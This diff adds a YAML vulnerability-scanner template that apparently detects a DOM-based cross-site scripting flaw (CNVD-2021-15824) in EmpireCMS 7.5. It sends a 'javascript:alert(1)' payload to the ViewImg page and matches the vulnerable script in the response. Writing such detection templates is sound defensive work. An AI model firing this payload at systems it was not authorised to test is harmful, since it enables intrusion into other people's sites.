@@ -1,0 +1,28 @@
+id: CNVD-2021-15824
+brief:
+    title: EmpireCMS 7.5 - Cross-Site Scripting
+    by: daffainfo
+    level: high
+    about: EmpireCMS is vulnerable to a DOM based cross-site scripting attack.
+    label:
+        - cnvd2021
+        - cnvd
+        - empirecms
+        - xss
+        - domxss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)'
+      signs:
+        - "on": word
+          has:
+            - if(Request("url")!=0)
+            - href=\""+Request("url")+"\"
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
